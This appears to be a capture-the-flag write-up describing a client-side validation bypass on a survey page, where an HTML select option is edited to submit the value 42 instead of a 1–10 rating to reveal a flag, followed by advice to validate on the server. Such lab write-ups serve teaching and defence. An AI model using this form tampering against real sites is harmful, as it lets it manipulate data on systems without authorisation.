Exploit: Client-Side Validation Bypass
======================================

Description
-----------
If we head to the Survey page, we can see a basic table with some names
and ratings. There are also buttons for each member to improve or worsen
their rating, rated from 1 to 10.

If we inspect the HTML, we can see that the buttons can be easily modified
to return **any value**. For example, we can change the button "2" to
return "42" instead.

```html
<form action="#" method="post">
	<input type="hidden" name="sujet" value="2">
	<SELECT name="valeur" onChange='javascript:this.form.submit();'>
		<option value="1">1</option>
		<option value="42">2</option>
		<option value="3">3</option>
		<option value="4">4</option>
		<option value="5">5</option>
		<option value="6">6</option>
		<option value="7">7</option>
		<option value="8">8</option>
		<option value="9">9</option>
		<option value="10">10</option>
	</SELECT>
</form>
```
Sending a value greater than the one expected by the server may cause undefined behaviour.
In this case, **the flag is revealed when we submit a value greater than 10**.

Possible solutions
------------------
1. As always, anything within the browser can be manipulated. The client-side
   validation is only for user convenience and should never be trusted, the real validation must occur on the server side.
   In this example, the server should handle errors gracefully and return an appropriate message if the value is out of the expected range.

Sources
-------
https://medium.com/@anandramesh24/understanding-client-side-validation-bypass-a-security-risk-you-cant-ignore-51f6a9f64f4c
